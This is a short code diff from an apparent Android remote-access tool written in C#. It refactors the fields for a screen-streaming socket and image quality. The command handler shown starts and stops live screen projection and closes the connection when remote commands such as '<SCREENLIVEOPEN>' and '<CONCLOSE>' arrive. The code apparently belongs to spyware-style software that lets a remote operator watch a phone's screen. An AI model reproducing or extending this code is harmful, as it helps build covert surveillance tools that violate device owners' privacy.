@@ -41,6 +41,10 @@ namespace Task2
         public IWindowManager windowManager = null;
         private PowerManager pm = null;
         private PowerManager.WakeLock wk = null;
+
+        public int kalite = 30;
+        public Socket screenSock;
+        public string ID = "";
         public override void OnCreate()
         {
             base.OnCreate();
@@ -1088,10 +1092,10 @@ namespace Task2
                 }
                 catch (Exception) { }
             }
-            if (ImageAvailableListener.screenSock != null)
+            if (screenSock != null)
             {
-                try { ImageAvailableListener.screenSock.Close(); } catch { }
-                try { ImageAvailableListener.screenSock.Dispose(); } catch { }
+                try { screenSock.Close(); } catch { }
+                try { screenSock.Dispose(); } catch { }
             }
 
         }
@@ -2177,14 +2181,14 @@ namespace Task2
                                 break;
 
                             case "<SCREENLIVEOPEN>":
-                                ImageAvailableListener.kalite = int.Parse(System.Text.Encoding.UTF8.GetString(dataBuff).Replace("%", ""));
+                                kalite = int.Parse(System.Text.Encoding.UTF8.GetString(dataBuff).Replace("%", ""));
                                 startProjection();
                                 break;
                             case "<SCREENLIVECLOSE>":
                                 stopProjection();
                                 break;
                             case "<SCREENQUALITY>":
-                                ImageAvailableListener.kalite = int.Parse(System.Text.Encoding.UTF8.GetString(dataBuff).Replace("%", ""));
+                                kalite = int.Parse(System.Text.Encoding.UTF8.GetString(dataBuff).Replace("%", ""));
                                 break;
                             case "<CONCLOSE>":
                                 CLOSE_CONNECTION = true;
